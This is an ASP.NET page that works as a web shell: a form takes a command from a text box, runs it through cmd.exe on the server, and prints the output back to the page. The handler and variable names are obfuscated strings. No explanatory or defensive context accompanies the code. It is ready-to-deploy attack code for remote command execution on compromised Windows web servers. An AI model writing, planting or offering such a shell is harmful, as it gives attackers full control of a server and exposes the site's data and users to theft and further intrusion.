<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<HTML>
    <body >
    <form id="cmd" method="post" runat="server">
    <asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
    <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="asdasgsfasdhawshsashfdsahsahdshd"></asp:Button>
    <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
    </form>
        <script Language="c#" runat="server">
        void asdasgsfasdhawshsashfdsahsahdshd(object sender, System.EventArgs e)
        {
            ProcessStartInfo asdfgasdfsdafadsasdfafsd = new ProcessStartInfo("cmd.exe", "/c "+txtArg.Text);
            asdfgasdfsdafadsasdfafsd.RedirectStandardOutput = true;
            asdfgasdfsdafadsasdfafsd.UseShellExecute = false;
            StreamReader stmrdr = Process.Start(asdfgasdfsdafadsasdfafsd).StandardOutput;
            string s = stmrdr.ReadToEnd();
            Response.Write("<pre>" + Server.HtmlEncode(s) + "</pre>");
            stmrdr.Close();
        }
        </script>
    </body>
</HTML>